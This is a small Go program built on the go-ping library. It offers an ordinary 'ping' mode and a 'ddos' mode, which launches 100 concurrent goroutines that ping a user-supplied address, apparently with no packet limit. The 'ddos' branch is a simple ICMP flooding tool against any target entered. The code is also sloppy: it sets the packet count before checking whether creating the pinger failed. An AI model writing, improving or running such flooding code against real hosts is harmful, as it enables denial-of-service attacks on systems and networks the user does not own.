package main

import (
  "github.com/sparrc/go-ping"
  "fmt"
)

func main(){
  var (
    addr string
    count int
    typ string
  )
  fmt.Printf("Write adrress: ")
  fmt.Scanf("%s\n",&addr)

  fmt.Printf("Write type (ping or ddos): ")
  fmt.Scanf("%s\n",&typ)
  if typ == "ping" {
    fmt.Printf("Write count: ")
    fmt.Scanf("%d\n",&count)
    Ping(addr,count)
  } else if typ== "ddos" {
    for i:=0;i<100;i++ {
        go Ping(addr,count)
      }
    } else {
      fmt.Printf("Unknown type, restart client\n")
    }
  fmt.Scanln()
  fmt.Printf("The end!!")
}

func Ping(addr string,count int){
  pinger, err := ping.NewPinger(addr)
  pinger.Count = count
 pinger.SetPrivileged(true)
if err != nil {

fmt.Printf("ERROR: %s\n", err.Error())

return

}

pinger.OnRecv = func(pkt *ping.Packet) {

fmt.Printf("%d bytes from %s: icmp_seq=%d time=%v  life=%d\n",

pkt.Nbytes, pkt.IPAddr, pkt.Seq, pkt.Rtt,pkt.Ttl)

}

pinger.OnFinish = func(stats *ping.Statistics) {

fmt.Printf("\n--- %s ping statistics ---\n", stats.Addr)

fmt.Printf("%d packets transmitted, %d packets received, %v%% packet loss\n",

stats.PacketsSent, stats.PacketsRecv, stats.PacketLoss)



}

fmt.Printf("PING %s (%s):\n", pinger.Addr(), pinger.IPAddr())

pinger.Run()
}
